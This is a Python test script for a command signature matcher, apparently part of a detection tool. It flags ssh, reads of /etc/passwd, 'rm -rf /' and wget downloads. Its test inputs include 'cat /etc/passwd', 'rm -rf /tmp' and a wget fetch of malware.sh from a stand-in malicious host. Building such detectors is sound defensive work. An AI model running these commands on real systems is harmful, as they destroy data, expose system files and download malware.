#!/usr/bin/env python3

from signature_matcher import SignatureMatcher
import json

# Test signature matching
signatures = [
    {'pattern': 'ssh', 'id': 'ssh_test', 'description': 'SSH command detected', 'type': 'ssh_command', 'regex': False},
    {'pattern': 'cat /etc/passwd', 'id': 'passwd_access', 'description': 'Sensitive file access', 'type': 'file_access', 'regex': False},
    {'pattern': r'rm\s+-rf\s+/', 'id': 'dangerous_rm', 'description': 'Dangerous rm command', 'type': 'dangerous_command', 'regex': True},
    {'pattern': 'wget', 'id': 'wget_download', 'description': 'File download detected', 'type': 'download', 'regex': False}
]

# Initialize the matcher
matcher = SignatureMatcher(signatures)

# Test commands
test_commands = [
    "ssh user@192.168.1.1",
    "cat /etc/passwd",
    "ls -la",
    "rm -rf /tmp",
    "wget http://malicious.com/malware.sh",
    "normal command"
]

print("Testing Signature Matcher:")
print("=" * 50)

for command in test_commands:
    print(f"\nTesting command: '{command}'")
    result = matcher.match(command)
    if result:
        print(f"  ✓ Matches found: {len(result)}")
        for match in result:
            print(f"    - ID: {match.get('id', 'N/A')}")
            print(f"      Pattern: {match['pattern']}")
            print(f"      Description: {match['description']}")
            print(f"      Type: {match.get('type', 'N/A')}")
    else:
        print("  ✗ No matches found")

print("\n" + "=" * 50)
print("Test completed!")
